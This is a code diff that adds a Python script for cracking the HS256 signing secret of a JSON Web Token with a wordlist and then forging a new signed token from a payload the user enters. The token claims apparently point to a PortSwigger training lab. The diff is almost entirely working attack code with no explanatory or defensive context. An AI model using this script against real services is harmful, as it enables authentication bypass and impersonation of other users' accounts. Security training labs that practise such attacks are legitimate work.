@@ -5,3 +5,16 @@ for secret in open("tokens.txt", "rb"): # Reading as bytes handles any character
     secret_bytes = secret.strip()
     sig = base64.urlsafe_b64encode(hmac.new(secret_bytes, header_payload.encode(), hashlib.sha256).digest()).decode().replace("=", "")
     if sig == target: print(f"Match found: {secret_bytes}")
+
+    import hmac, hashlib, base64
+header_payload, target = "eyJraWQiOiIzZTMxNjA2NS0xMWFkLTRhZjktYTllMC0xMDk2MTA4MzhkNDAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2NzAzMzQ0OSwic3ViIjoid2llbmVyIn0", "OKUMpuvlTVF0F7zvWlpd3hMW0qQd7jAmRfjcL5cXNUQ"
+found_secret = None
+for secret in open("tokens.txt", "rb"):
+    secret_bytes = secret.strip()
+    sig = base64.urlsafe_b64encode(hmac.new(secret_bytes, header_payload.encode(), hashlib.sha256).digest()).decode().replace("=", "")
+    if sig == target: found_secret = secret_bytes; print(found_secret); break
+if found_secret:
+    new_payload = input("Enter new Base64 payload: ")
+    to_sign = f"eyJraWQiOiIzZTMxNjA2NS0xMWFkLTRhZjktYTllMC0xMDk2MTA4MzhkNDAiLCJhbGciOiJIUzI1NiJ9.{new_payload}"
+    new_sig = base64.urlsafe_b64encode(hmac.new(found_secret, to_sign.encode(), hashlib.sha256).digest()).decode().replace("=", "")
+    print(f"New JWT: {to_sign}.{new_sig}")
